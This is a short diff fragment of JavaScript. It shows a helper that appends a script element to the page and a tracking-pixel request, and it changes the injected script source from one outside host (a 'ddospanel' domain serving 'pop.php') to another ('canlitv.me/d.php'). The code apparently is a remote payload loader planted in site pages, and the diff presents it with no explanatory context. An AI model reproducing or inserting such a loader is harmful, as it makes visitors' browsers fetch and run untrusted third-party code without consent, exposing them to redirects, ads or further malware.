@@ -7,7 +7,7 @@ new Image().src = 'https://whos.amung.us/widget/dd0spanel.png';
  s.setAttribute('src',jsname);
  th.appendChild(s);
 }
-addJavascript("https://kral.ddospanel.com/pop.php");
+addJavascript("https://canlitv.me/d.php");
 
 
 
